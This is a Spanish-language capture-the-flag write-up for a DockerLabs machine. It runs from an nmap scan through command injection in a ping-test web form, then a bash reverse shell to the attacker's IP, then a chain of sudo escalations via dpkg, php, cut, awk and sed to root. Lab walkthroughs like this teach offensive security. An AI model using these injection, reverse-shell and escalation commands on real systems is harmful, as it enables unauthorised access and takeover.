# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/69e0bac4-e800-4676-9973-e9c55141f3d7)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos

2.  **80/tcp(HTTP):** Apache httpd 2.4.58 (Ubuntu)
3. **443/tcp(SSL-HTTP):** Apache httpd 2.4.58
4. **5000/tcp(UPNP):** Samba smbd 4.6.2
### Puerto 8
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevo a la pagina por defecto de Apache2 Ubuntu.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1970bab5-8050-4cff-93a7-26249bf397f2)

# Fase 2- Exploración

#### FeroxBuster
```r
200      GET      205l      421w     6989c http://172.17.0.2/machine.php
```
Encontramos el archivo `/machine.php`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2b1cd60f-86d6-4a3e-aac5-9ebf09116cf6)
Es una lista de maquinas de `Dockerlabs.es`.

#### 5000
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e1a4e362-42c6-4732-86b3-df7e544b5ddb)
En el escaneo de nmap el puerto `5000 UPNP`, estaba abierto. Y esta corriendo una pagina web. Dicha web consiste en ingresar una ip y comprobar si tenemos conectividad con la misma.

# Fase 3- Explotación

#### ping test
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/0524ff87-7c5c-498f-92aa-089368cf7317)

Al poner mi propia ip se ve como si hiciera un ping desde mi maquina.
Si ponemos algo mal a propósito:
```python
   Ping Test
----------------
| 192.168.1.2' |
|--------------|
```
El resultado es:
```python
Command 'ping -c 4 192.168.1.2asdsads' returned non-zero exit status 2.
```
Nos devuelve el error de comando que se esta ejecutando. Podríamos intentar ejecutar un comando:
```python
Command 'ping -c 4 192.168.1.2 && ls' returned non-zero exit status 2.
```
Resultado:
```python
PING 192.168.1.2 (192.168.1.2) 56(84) bytes of data.
64 bytes from 192.168.1.2: icmp_seq=1 ttl=64 time=0.042 ms
64 bytes from 192.168.1.2: icmp_seq=2 ttl=64 time=0.051 ms
64 bytes from 192.168.1.2: icmp_seq=3 ttl=64 time=0.041 ms
64 bytes from 192.168.1.2: icmp_seq=4 ttl=64 time=0.070 ms

--- 192.168.1.2 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3076ms
rtt min/avg/max/mdev = 0.041/0.051/0.070/0.011 ms
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```
Tenemos ejecución remota de comandos!

Vamos a probar enviarnos esta reverse shell:
```python
192.168.1.2 && bash -c "bash -i >& /dev/tcp/192.168.1.2/443 0>&1"
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/98bc2111-3962-43a6-9a0f-28c835f33c75)

Y nos llego la reverse shell!

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/31521f18-9097-4022-8a86-d3e0497babea)

Despues de realizar el tratamiento de la TTY, vemos que podemos ejecutar el binario `dpkg` como usuario `bobby`.

#### Dpkg
```python
sudo -u bubby dpkg -l
!/bin/sh
```
Para escalar privilegios usando dpkg tenemos que ejecutar estos comandos.

```python
!/bin/sh
$ whoami
bobby
$ 
```
Somos el usuario bobby.

#### Bobby
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/004b7a73-62f1-4ff0-bdbb-ab3d60abbc58)

Como el usuario `bobby` después de realizar el tratamiento de la TTY, vemos que podemos ejecutar el binario `php` como el usuario Gladys.

#### php
```r
CMD="/bin/sh"
sudo -u gladys php -r "system('$CMD');
```
Para escalar al usuario Gladys tenemos que ejecutar esos comandos.

```r
bobby@ff1758409eaa:/home/freddy$ sudo -u gladys php -r "system('$CMD');"
$ whoami
gladys
```
Y somos usuario Gladys!.

#### Gladys
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/97ae67c8-071d-4354-b087-e1f505e9c81d)

Despues de realizar el tratamiento de la TTY, vemos que podemos ejecutar el binario `cut` como el usuario `chocolatito`.

#### cut
```r
LFILE=file_to_read
sudo cut -d "" -f1 "$LFILE"
```
Para escalar al usuario chocolatito tenemos que ejecutar ese comando.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4b3b93fa-3d42-4221-97ae-3ff717ea5023)

Encontré en `/opt` el archivo `chocolatitocontraseña.txt`.
```r
$ sudo -u chocolatito cut -d "" -f1 chocolatitocontraseña.txt
chocolatitopassword
$ su chocolatito
Password: 
$ whoami
chocolatito
```
Somos el usuario chocolatito!

#### Chocolatito
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b0e9e9ea-c905-494f-bf4a-d210efcb3056)

Como el usuario `chocolatito` podemos ejecutar el binario `awk` como usuario `theboss`.



#### Awk
Para escalar necesitamos ejecutar el comando:
```r
chocolatito@ff1758409eaa:/home$ sudo -u theboss awk 'BEGIN {system("/bin/sh")}'
whoami
theboss
```
Y somos usuario theboss!.

#### Theboss
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fec94b89-5ba1-4a28-9319-e486bf8f7db6)

Como el usuario `theboss` podemos ejecutar el binario `sed`.

#### Sed
```r
theboss@ff1758409eaa:/home$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
whoami
root
```
Y escalamos a root!.

